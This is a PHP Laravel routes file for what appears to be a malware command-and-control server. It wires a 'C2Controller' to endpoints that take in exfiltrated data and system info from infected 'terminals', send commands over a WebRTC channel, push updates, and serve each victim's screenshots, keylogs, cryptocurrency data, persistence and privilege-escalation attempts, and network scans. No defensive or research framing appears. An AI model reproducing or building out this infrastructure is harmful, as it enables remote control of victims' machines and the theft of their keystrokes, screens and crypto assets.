<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Api\C2Controller;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
*/

Route::post('/status', [C2Controller::class, 'statusUpdate']);
Route::post('/upload', [C2Controller::class, 'upload']);
Route::post('/systeminfo', [C2Controller::class, 'systemInfo']);
Route::get('/terminals', [C2Controller::class, 'listTerminals']);
Route::get('/livefeed/{id}', [C2Controller::class, 'getLiveFeed']);
Route::post('/exfiltrate', [C2Controller::class, 'exfiltrate']);
Route::post('/logs', [C2Controller::class, 'storeLogs']);

// Telemetry batch endpoint (receives all reports from XYZ)
Route::post('/telemetry/batch', [C2Controller::class, 'receiveTelemetryBatch']);

Route::prefix('webrtc')->group(function () {
    Route::post('/register', [C2Controller::class, 'webrtcRegister']);
    Route::post('/heartbeat', [C2Controller::class, 'webrtcHeartbeat']);
    Route::get('/commands/{sessionId}', [C2Controller::class, 'webrtcPollCommands']);
    Route::post('/result', [C2Controller::class, 'webrtcResult']);
});

Route::get('/update/check', [C2Controller::class, 'checkForUpdates']);

// Enhanced data viewing endpoints
Route::get('/telemetry/{terminalId}', [C2Controller::class, 'getTelemetry']);
Route::get('/screenshots/{terminalId}', [C2Controller::class, 'getScreenshots']);
Route::get('/keylogs/{terminalId}', [C2Controller::class, 'getKeylogs']);
Route::get('/crypto/{terminalId}', [C2Controller::class, 'getCryptoData']);
Route::get('/timeline/{terminalId}', [C2Controller::class, 'getTimeline']);

// Detailed reports endpoints
Route::get('/persistence/{terminalId}', [C2Controller::class, 'getPersistenceAttempts']);
Route::get('/escalation/{terminalId}', [C2Controller::class, 'getEscalationAttempts']);
Route::get('/network-scans/{terminalId}', [C2Controller::class, 'getNetworkScans']);

